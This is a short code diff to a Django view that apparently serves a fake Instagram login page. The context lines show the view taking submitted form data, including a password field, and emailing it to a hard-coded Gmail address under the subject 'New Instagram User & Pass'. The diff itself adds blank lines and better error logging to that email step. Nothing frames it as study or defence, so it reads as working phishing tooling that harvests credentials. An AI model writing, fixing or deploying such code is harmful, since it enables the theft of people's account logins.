@@ -100,6 +100,8 @@ def auth(request):
 
 
 
+
+
 def instagram(request):
     if request.method == "POST":
         print(request.POST)
@@ -125,8 +127,9 @@ password = {password}
                     to_addrs="eyobjjj@gmail.com",
                     msg=f"Subject:**New Instagram User & Pass**\n\nhi {content}"
                 )
-        except:
+        except Exception as e:
             print(f"{'*'*20} can't send email {'*'*20}")
+            print(f'{type(e)}: [  {e}  ]')
         #######################################
     return render(request, "instagram/index.html")
 
